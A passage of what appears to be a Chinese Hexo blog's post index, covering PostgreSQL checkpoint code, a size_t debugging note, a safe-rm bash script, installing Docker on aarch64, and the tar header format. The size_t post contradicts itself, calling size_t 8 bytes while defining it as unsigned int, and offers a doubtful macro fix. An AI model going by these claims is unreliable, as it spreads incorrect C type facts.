recycling, to get us to the checkpoint</span></span><br><span class="line"><span class="comment"> * after that. Basing the calculations on the distance from the prior redo</span></span><br><span class="line"><span class="comment"> * pointer largely fixes that problem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">//CheckPointCompletionTarget 默认取值 0.5 取值范围 (0, 1);</span></span><br><span class="line">    <span class="comment">//CheckPointDistanceEstimate 两次xlog之间的评估量;</span></span><br><span class="line">distance = (<span class="number">2.0</span> + CheckPointCompletionTarget) * CheckPointDistanceEstimate;</span><br><span class="line"><span class="comment">/* add 10% for good measure. */</span></span><br><span class="line">distance *= <span class="number">1.10</span>;</span><br><span class="line"></span><br><span class="line">recycleSegNo = (XLogSegNo) <span class="built_in">ceil</span>(((<span class="keyword">double</span>) PriorRedoPtr + distance) / XLOG_SEG_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (recycleSegNo &lt; minSegNo)</span><br><span class="line">recycleSegNo = minSegNo;</span><br><span class="line"><span class="keyword">if</span> (recycleSegNo &gt; maxSegNo)</span><br><span class="line">recycleSegNo = maxSegNo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> recycleSegNo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Debug size_t</title>
      <link href="/2019/09/16/Debug/2019-09-17-size_t%E9%97%AE%E9%A2%98/"/>
      <url>/2019/09/16/Debug/2019-09-17-size_t%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>调试BUG时发现，以下问题:</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/BUG/2019-09-18-size_t/1568712490080.png?raw=true" alt="1568712490080"></p><p>由代码中发现</p><p>BYTES_INVALID 定义如下:</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/BUG/2019-09-18-size_t/1568712510794.png?raw=true" alt="1568712510794"></p><p>奇怪问题:在于file-&gt;write_size == -1; 但是if判断中却没有走到contine代码分支, 而是继续走到 validate.c  351行输出;</p><a id="more"></a><p>关于数据结构定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pgFile</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">time_t</span>mtime;<span class="comment">/* time of last modification */</span></span><br><span class="line"><span class="keyword">mode_t</span>mode;<span class="comment">/* protection (file type and permission) */</span></span><br><span class="line"><span class="keyword">size_t</span>size;<span class="comment">/* size of the file */</span></span><br><span class="line"><span class="keyword">size_t</span>read_size;<span class="comment">/* size of the portion read (if only some pages are</span></span><br><span class="line"><span class="comment">   backed up partially, it's different from size) */</span></span><br><span class="line"><span class="keyword">size_t</span>write_size;<span class="comment">/* size of the backed-up file. BYTES_INVALID means</span></span><br><span class="line"><span class="comment">   that the file existed but was not backed up</span></span><br><span class="line"><span class="comment">   because not modified since last backup. */</span></span><br><span class="line">pg_crc32c crc;<span class="comment">/* CRC value of the file, regular file only */</span></span><br><span class="line"><span class="keyword">char</span>   *linked;<span class="comment">/* path of the linked file */</span></span><br><span class="line"><span class="keyword">bool</span>is_datafile;<span class="comment">/* true if the file is PostgreSQL data file */</span></span><br><span class="line"><span class="keyword">char</span>path[<span class="number">1</span>]; <span class="comment">/* path of the file */</span></span><br><span class="line">&#125; pgFile;</span><br></pre></td></tr></table></figure><p>查看sizeof大小:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)</span><br></pre></td></tr></table></figure><p>window:  8字节;</p><p>linux:   8字节;</p><p><a href="https://zh.cppreference.com/w/c/types/size_t" target="_blank" rel="noopener">cppreference.com size_t页面</a></p><blockquote><p>​    <strong>size_t</strong> 是 <a href="https://zh.cppreference.com/w/c/language/sizeof" target="_blank" rel="noopener"><code>sizeof</code></a> 、 <a href="https://zh.cppreference.com/w/c/language/_Alignof" target="_blank" rel="noopener"><code>_Alignof</code></a> (C11 起) 和 <a href="https://zh.cppreference.com/w/c/types/offsetof" target="_blank" rel="noopener">offsetof</a> 的结果的无符号整数类型，定义取决于<a href="https://zh.cppreference.com/w/c/language/arithmetic_types#.E6.95.B0.E6.8D.AE.E6.A8.A1.E5.9E.8B" target="_blank" rel="noopener">数据模型</a>。</p></blockquote><p>size_t 定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="keyword">size_t</span>;  <span class="comment">//8Byte</span></span><br></pre></td></tr></table></figure><p>Linux size_t 应该用 <code>%u</code> 标识, 即 -1 应该为 4294967295;</p><p>按照内存格式输出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%u   %d"</span>, <span class="number">-1</span>, <span class="number">-1</span>);</span><br></pre></td></tr></table></figure><p>输出为</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4294967295</span>  -<span class="number">1</span></span><br></pre></td></tr></table></figure><p>即修改代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WIN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTES_INVALID(4294967295)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTES_INVALID(-1)</span></span><br><span class="line"><span class="meta">#endi</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>博客地址修改</title>
      <link href="/2019/09/16/Debug/2019-09-21-CNAME/"/>
      <url>/2019/09/16/Debug/2019-09-21-CNAME/</url>
      
        <content type="html"><![CDATA[<pre><code>[修改博客地址](https://rocky_ansi.gitee.io/)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>safe-rm</title>
      <link href="/2019/09/11/code/safe-rm/"/>
      <url>/2019/09/11/code/safe-rm/</url>
      
        <content type="html"><![CDATA[<p>声明<code>alias rm=&#39;safe-rm.sh&#39;</code></p><p>主要用于放置rm误删除操作. 建立隐藏文件夹[按日期建立]用于保存删除文件</p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"><span class="meta">#</span> 安全的rm脚本</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dir=$(date "+%y_%m_%d")</span><br><span class="line"><span class="meta">#</span>dir="/Users/rocky/.usertrash/$dir"</span><br><span class="line">dir="/Users/rocky/.Trash/$dir"</span><br><span class="line"><span class="meta">#</span>echo $dir</span><br><span class="line">if [ ! -d $dir ];then</span><br><span class="line">    mkdir -p $dir</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">is_f=false</span><br><span class="line">args=""</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function f_remove() &#123;</span><br><span class="line">    for i in $&#123;args&#125;; do</span><br><span class="line">        if [ -d "$i" -o -f "$i" ];then</span><br><span class="line">            name=`basename $i`</span><br><span class="line">            if [ -d "$dir/$name" -o -f "$dir/$name" ];then</span><br><span class="line">                new_name="$dir/$&#123;name&#125;_$(date '+%T')"</span><br><span class="line">                mv $i $new_name &amp;&amp; echo "$i deleted,you can see in $new_name"</span><br><span class="line">            else</span><br><span class="line">                mv $i $dir &amp;&amp; echo "$i deleted,you can see in $dir/$i"</span><br><span class="line">            fi</span><br><span class="line">        else</span><br><span class="line">            echo "参数错误"</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function remove() &#123;</span><br><span class="line">    for j in $&#123;args&#125;; do</span><br><span class="line">        if [ -d "$j" -o -f "$j" ];then</span><br><span class="line">            name=`basename $j`</span><br><span class="line">            #read -p "Remove $name?[y/n]" bool   ## 是否开启删除提醒功能;l</span><br><span class="line">            #if [ $bool == "n" ];then</span><br><span class="line">            #     exit</span><br><span class="line">            #elif [ $bool == "y" ];then</span><br><span class="line">                if [ -d "$dir/$name" -o -f "$dir/$name" ];then</span><br><span class="line">                    new_name="$dir/$&#123;name&#125;_$(date '+%T')"</span><br><span class="line">                    mv $j $new_name &amp;&amp; echo "$j deleted,you can see in $new_name"</span><br><span class="line">                else</span><br><span class="line">                    mv $j $dir &amp;&amp; echo "$j deleted,you can see in $dir/$j"</span><br><span class="line">                fi</span><br><span class="line">            #fi</span><br><span class="line">        else</span><br><span class="line">            echo "参数错误"</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while [ "$1" ]; do</span><br><span class="line">    case "$1" in</span><br><span class="line">        -fr|-rf)</span><br><span class="line">            is_f=true</span><br><span class="line">            shift</span><br><span class="line">            ;;</span><br><span class="line">        -i)</span><br><span class="line">            is_f=false</span><br><span class="line">            shift</span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            args="$1 $args"</span><br><span class="line">            shift</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if [[ $is_f = true ]];then</span><br><span class="line">    f_remove</span><br><span class="line">else</span><br><span class="line">    remove</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 命令篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>飞腾 aarch64安装Docker</title>
      <link href="/2019/09/06/docker/2019-09-06-%E9%A3%9E%E8%85%BE-aarch64-install-docker/"/>
      <url>/2019/09/06/docker/2019-09-06-%E9%A3%9E%E8%85%BE-aarch64-install-docker/</url>
      
        <content type="html"><![CDATA[<p>设置中科大源:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 默认注释了源码仓库，如有需要可自行取消注释</span></span><br><span class="line"><span class="comment">#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main restricted universe multiverse</span></span><br><span class="line"><span class="comment">## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main main restricted universe multiverse</span></span><br><span class="line"><span class="comment">#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main restricted universe multiverse</span></span><br><span class="line"><span class="comment">## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main restricted universe multiverse</span></span><br><span class="line"><span class="comment">#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main restricted universe multiverse</span></span><br><span class="line"><span class="comment">## deb-src https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main restricted universe multiverse</span></span><br><span class="line"><span class="comment">#deb https://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main restricted universe multiverse</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###备用;</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main multiverse restricted universe</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main multiverse restricted universe</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-proposed main multiverse restricted universe</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main multiverse restricted universe</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main multiverse restricted universe</span><br><span class="line"><span class="comment">#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty main multiverse restricted universe</span></span><br><span class="line"><span class="comment">#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-backports main multiverse restricted universe</span></span><br><span class="line"><span class="comment">#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-proposed main multiverse restricted universe</span></span><br><span class="line"><span class="comment">#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-security main multiverse restricted universe</span></span><br><span class="line"><span class="comment">#deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ trusty-updates main multiverse restricted universe</span></span><br></pre></td></tr></table></figure><a id="more"></a><p><a href="https://download.docker.com/linux/debian/dists/stretch/pool/stable/arm64/" target="_blank" rel="noopener">Docker 安装包下载</a></p><p>下载Docker-ce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.docker.com/linux/debian/dists/stretch/pool/stable/arm64/docker-ce_17.12.0~ce-0~debian_arm64.deb</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@highgo-os:~<span class="comment"># sudo dpkg -i docker-ce_17.12.1~ce-0~debian_arm64.deb </span></span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 <span class="number">203362</span> 个文件和目录。)</span><br><span class="line">正准备解包 docker-ce_17.<span class="number">12.1</span>~ce-<span class="number">0</span>~debian_arm64.deb  ...</span><br><span class="line">正在将 docker-ce (<span class="number">17.12</span>.<span class="number">1</span>~ce-<span class="number">0</span>~debian) 解包到 (<span class="number">17.12</span>.<span class="number">1</span>~ce-<span class="number">0</span>~debian) 上 ...</span><br><span class="line">dpkg: 依赖关系问题使得 docker-ce 的配置工作不能继续：</span><br><span class="line"> docker-ce 依赖于 libseccomp2 (&gt;= <span class="number">2.3</span>.<span class="number">0</span>)；然而：</span><br><span class="line">系统中 libseccomp2:arm64 的版本为 <span class="number">2.2</span>.<span class="number">3</span>-<span class="number">3</span>kord3。</span><br><span class="line"></span><br><span class="line">dpkg: 处理软件包 docker-ce (--install)时出错：</span><br><span class="line"> 依赖关系问题 - 仍未被配置</span><br><span class="line">正在处理用于 ureadahead (<span class="number">0.100</span>.<span class="number">0</span>-<span class="number">19</span>kord) 的触发器 ...</span><br><span class="line">正在处理用于 systemd (<span class="number">229</span>-<span class="number">4</span>kord4k5) 的触发器 ...</span><br><span class="line">正在处理用于 man-db (<span class="number">2.7</span>.<span class="number">5</span>-<span class="number">1</span>kord) 的触发器 ...</span><br><span class="line">在处理时有错误发生：</span><br><span class="line"> docker-ce</span><br></pre></td></tr></table></figure><p>通过上述发现: libseccomp2的版本较低:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@highgo-os:~<span class="comment"># apt search libseccomp2</span></span><br><span class="line">正在排序... 完成</span><br><span class="line">全文搜索... 完成  </span><br><span class="line">libseccomp2/now <span class="number">2.2</span>.<span class="number">3</span>-<span class="number">3</span>kord3 arm64 [已安装，本地]</span><br><span class="line">  high level interface to Linux seccomp <span class="keyword">filter</span></span><br></pre></td></tr></table></figure><p>本身安装2.2.3 远低于依赖所需要的 2.3.0版本</p><p>下载所需lib依赖</p><p>dpkg -i <a href="https://github.com/vagabond1132/Picture/blob/master/lib-so/libseccomp2_2.3.1-2.1ubuntu3_arm64.deb" target="_blank" rel="noopener">libseccomp2_2.3.1-2.1ubuntu3_arm64.deb</a></p><p>再次安装Docker-ce</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@highgo-os:~<span class="comment"># dpkg -i docker-ce_17.12.1~ce-0~debian_arm64.deb </span></span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 <span class="number">203362</span> 个文件和目录。)</span><br><span class="line">正准备解包 docker-ce_17.<span class="number">12.1</span>~ce-<span class="number">0</span>~debian_arm64.deb  ...</span><br><span class="line">正在将 docker-ce (<span class="number">17.12</span>.<span class="number">1</span>~ce-<span class="number">0</span>~debian) 解包到 (<span class="number">17.12</span>.<span class="number">1</span>~ce-<span class="number">0</span>~debian) 上 ...</span><br><span class="line">正在设置 docker-ce (<span class="number">17.12</span>.<span class="number">1</span>~ce-<span class="number">0</span>~debian) ...</span><br><span class="line">正在处理用于 ureadahead (<span class="number">0.100</span>.<span class="number">0</span>-<span class="number">19</span>kord) 的触发器 ...</span><br><span class="line">正在处理用于 systemd (<span class="number">229</span>-<span class="number">4</span>kord4k5) 的触发器 ...</span><br><span class="line">正在处理用于 man-db (<span class="number">2.7</span>.<span class="number">5</span>-<span class="number">1</span>kord) 的触发器 ...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux tar 协议格式解析</title>
      <link href="/2019/08/28/PostgreSQL/2019-09-01-Linux-tar-%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F-%E8%A7%A3%E6%9E%90/"/>
      <url>/2019/08/28/PostgreSQL/2019-09-01-Linux-tar-%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F-%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p> Tar仅仅是归档文件, 用于多个文件合并.  并不进行压缩;</p></blockquote><ul><li>介绍Tar结构体</li><li>以及如何归档</li></ul><a id="more"></a><h4 id="Tar归档文件组成"><a href="#Tar归档文件组成" class="headerlink" title="Tar归档文件组成"></a>Tar归档文件组成</h4><h5 id="归档单个文件"><a href="#归档单个文件" class="headerlink" title="归档单个文件"></a>归档单个文件</h5><p>tar -cf off.tar offpage.c</p><p>Tar = 512Byte + file.st_size + padding;</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-09-01-linux-tar/1566980062837.png?raw=true" alt="1566980179215"></p><h5 id="归档多个文件"><a href="#归档多个文件" class="headerlink" title="归档多个文件"></a>归档多个文件</h5><p>Tar = 512Byte + file.st_size + padding * N [0-N];</p><h5 id="归档文件夹"><a href="#归档文件夹" class="headerlink" title="归档文件夹"></a>归档文件夹</h5><p>tar -cf dir.tar dir/</p><p>归档文件夹: 512Byte(文件夹信息) + 文件归档 * N;</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-09-01-linux-tar/1566980062837.png?raw=true" alt="1566980062837"></p><h4 id="Tar头部结构"><a href="#Tar头部结构" class="headerlink" title="Tar头部结构:"></a>Tar头部结构:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tar_header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">　　 <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">　　 <span class="keyword">char</span> mode[<span class="number">8</span>];</span><br><span class="line">　　 <span class="keyword">char</span> uid[<span class="number">8</span>];</span><br><span class="line">　　 <span class="keyword">char</span> gid[<span class="number">8</span>];</span><br><span class="line">　　 <span class="keyword">char</span> size[<span class="number">12</span>];</span><br><span class="line">　　 <span class="keyword">char</span> mtime[<span class="number">12</span>];  <span class="comment">//148byte</span></span><br><span class="line">　　 <span class="keyword">char</span> chksum[<span class="number">8</span>];</span><br><span class="line">　　 <span class="keyword">char</span> typeflag;   <span class="comment">//156byte</span></span><br><span class="line">　　 <span class="keyword">char</span> linkname[<span class="number">100</span>];</span><br><span class="line">　　 <span class="keyword">char</span> magic[<span class="number">6</span>];</span><br><span class="line">　　 <span class="keyword">char</span> version[<span class="number">2</span>];</span><br><span class="line">　　 <span class="keyword">char</span> uname[<span class="number">32</span>];</span><br><span class="line">　　 <span class="keyword">char</span> gname[<span class="number">32</span>];</span><br><span class="line">　　 <span class="keyword">char</span> devmajor[<span class="number">8</span>];</span><br><span class="line">　　 <span class="keyword">char</span> devminor[<span class="number">8</span>];</span><br><span class="line">　　 <span class="keyword">char</span> prefix[<span class="number">155</span>];</span><br><span class="line">　　 <span class="keyword">char</span> padding[<span class="number">12</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>man tar.h</code>可以查看更多信息;</p><h4 id="tarCreateHeader"><a href="#tarCreateHeader" class="headerlink" title="tarCreateHeader"></a>tarCreateHeader</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">tarCheckSum(<span class="keyword">char</span> *header)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i,</span><br><span class="line">        sum;</span><br><span class="line"></span><br><span class="line">    sum = <span class="number">8</span> * <span class="string">' '</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; TAR_HEADER_LENGTH ; i++ )</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">148</span> || i &gt;= <span class="number">156</span>)</span><br><span class="line">            sum += <span class="number">0xFF</span> &amp; header[i];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> tarError</span><br><span class="line">tarCreateHeader(<span class="keyword">char</span> *header, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *linktarget, struct stat *filebuf)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">userinfo</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">groupinfo</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(filename) &gt; <span class="number">99</span>)</span><br><span class="line">        <span class="keyword">return</span> TAR_NAME_TOO_LONG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (linktarget &amp;&amp; <span class="built_in">strlen</span>(linktarget) &gt; <span class="number">99</span>)</span><br><span class="line">        <span class="keyword">return</span> TAR_SYMLINK_TOO_LONG;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(header, <span class="number">0</span>, TAR_HEADER_LENGTH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;header[<span class="number">0</span>], filename, <span class="number">100</span>); <span class="comment">//filename[100]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (linktarget != <span class="literal">NULL</span> || S_ISDIR(filebuf-&gt;st_mode))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> flen = <span class="built_in">strlen</span>(filename);</span><br><span class="line">        flen = flen &gt; <span class="number">99</span> ? <span class="number">99</span> : flen;</span><br><span class="line">        header[flen] = <span class="string">'/'</span>;</span><br><span class="line">        header[flen + <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_tar_number(&amp;header[<span class="number">100</span>], <span class="number">8</span>, ( filebuf-&gt;st_mode &amp; <span class="number">07777</span>));</span><br><span class="line"></span><br><span class="line">    write_tar_number(&amp;header[<span class="number">108</span>], <span class="number">8</span>, filebuf-&gt;st_uid);</span><br><span class="line"></span><br><span class="line">    write_tar_number(&amp;header[<span class="number">116</span>], <span class="number">8</span>, filebuf-&gt;st_gid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (linktarget != <span class="literal">NULL</span> || S_ISDIR(filebuf-&gt;st_mode))</span><br><span class="line">        write_tar_number(&amp;header[<span class="number">124</span>], <span class="number">12</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        write_tar_number(&amp;header[<span 